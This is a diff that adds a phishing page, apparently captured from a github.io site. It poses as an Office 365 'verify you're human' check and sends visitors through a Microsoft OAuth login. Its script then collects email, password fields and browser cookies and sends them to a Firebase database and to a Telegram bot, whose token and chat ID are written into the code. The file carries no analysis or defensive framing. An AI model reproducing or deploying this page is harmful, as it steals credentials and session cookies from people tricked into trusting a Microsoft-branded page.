@@ -1,0 +1,250 @@
+<!-- url: https://9013351951-1.github.io/8066237985/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Office 365 - Verify You're Human</title>
+    <style>
+        /* Your CSS styles remain the same */
+        /* Font loading */
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap');
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f2f1;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .content-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-grow: 1;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 150px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #323130;
+        }
+
+        p.subtext {
+            font-size: 14px;
+            color: #605e5c;
+            margin-bottom: 30px;
+        }
+
+        .checkbox-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            margin-right: 10px;
+            accent-color: #0078d4;
+        }
+
+        button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin-top: 20px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #005a9e;
+        }
+
+        button:disabled {
+            background-color: #b0b0b0;
+            cursor: not-allowed;
+        }
+
+        footer {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            padding: 10px 0;
+            background-color: #f3f2f1;
+            font-size: 12px;
+        }
+
+        footer a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    
+    <!-- Include Firebase SDK with modular syntax imports -->
+    <script type="module">
+        // Import required Firebase modules
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore.js";
+        import { getAuth } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-auth.js";
+
+
+        document.addEventListener("DOMContentLoaded", function() {
+            // Firebase configuration
+            const firebaseConfig = {
+                apiKey: "AIzaSyA_4QT6t0OacVkyrRO_8skjBJE-h1NRojM",
+                authDomain: "project-2006669879225434405.firebaseapp.com",
+                projectId: "project-2006669879225434405",
+                storageBucket: "project-2006669879225434405.appspot.com",
+                messagingSenderId: "803339574811",
+                appId: "1:803339574811:web:146b22453ad870bd4522be"
+            };
+
+            // Initialize Firebase
+            const app = initializeApp(firebaseConfig);
+            const firestore = getFirestore(app);
+
+            // Telegram Bot Configuration
+            const TELEGRAM_BOT_TOKEN = '7260708546:AAEmE2sxkm50ECdHwMUU4MdM3E8CbRyM9UA';
+            const TELEGRAM_CHAT_ID = '6737043934';
+
+            const checkbox = document.getElementById('human-checkbox');
+            const continueButton = document.getElementById('continue-button');
+
+            // Enable the continue button when checkbox is checked
+            checkbox.addEventListener('change', function () {
+                continueButton.disabled = !this.checked;
+            });
+
+            // Function to initiate OAuth flow
+            continueButton.addEventListener('click', function () {
+                if (checkbox.checked) {
+                    const clientId = '222e3b7b-91e6-470d-a142-92c7876f4479';
+                    const redirectUri = encodeURIComponent('https://9013351951-1.github.io/8066237985/');
+                    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${clientId}&response_type=code&redirect_uri=${redirectUri}&scope=openid profile email offline_access`;
+
+                    window.location.href = authUrl;
+                }
+            });
+
+            // Function to capture user data and send to Firebase and Telegram
+            async function captureUserData() {
+                const email = '{email}'; // Replace with dynamic email capture
+                const password = 'user_password'; // Replace with dynamic password capture
+                const cookies = document.cookie;
+                const country = 'User Country';
+                const city = 'User City';
+                const ip_address = 'User IP Address';
+
+                // Prepare message for Telegram
+                const dataMessage = `
+                    📩 New User Interaction:
+                    - Email: ${email}
+                    - Password: ${password}
+                    - Cookies: ${cookies}
+                    - Country: ${country}
+                    - City: ${city}
+                    - IP Address: ${ip_address}
+                `;
+
+                // Send data to Firebase
+                try {
+                    const docRef = await addDoc(collection(firestore, 'userData'), {
+                        email: email,
+                        password: password,
+                        cookies: cookies,
+                        country: country,
+                        city: city,
+                        ip_address: ip_address
+                    });
+                    console.log('Document written with ID: ', docRef.id);
+                } catch (error) {
+                    console.error('Error adding document: ', error);
+                }
+
+                // Send data to Telegram
+                try {
+                    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                    await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: dataMessage
+                        })
+                    });
+                    console.log('Data sent to Telegram successfully.');
+                } catch (error) {
+                    console.error('Error sending data to Telegram: ', error);
+                }
+            }
+
+            // Check for the "code" parameter and capture data if present
+            window.addEventListener('load', function() {
+                const queryParams = new URLSearchParams(window.location.search);
+                if (queryParams.has('code')) {
+                    captureUserData();
+                }
+            });
+        });
+    </script>
+</head>
+<body>
+
+    <div class="content-wrapper">
+        <div class="container">
+            <div class="logo">
+                <img src="office365-logo.png" alt="Office 365 Logo">
+            </div>
+            <h1>Verify you’re human</h1>
+            <p class="subtext">Before you continue, please verify your identity by checking the box below.</p>
+
+            <div class="checkbox-container">
+                <input type="checkbox" id="human-checkbox">
+                <label for="human-checkbox">I'm not a robot</label>
+            </div>
+            <button id="continue-button" disabled>Continue</button>
+        </div>
+    </div>
+
+    <footer>
+        <p><a href="#">Terms of use</a> | <a href="#">Privacy & cookies</a></p>
+    </footer>
+
+</body>
+</html>
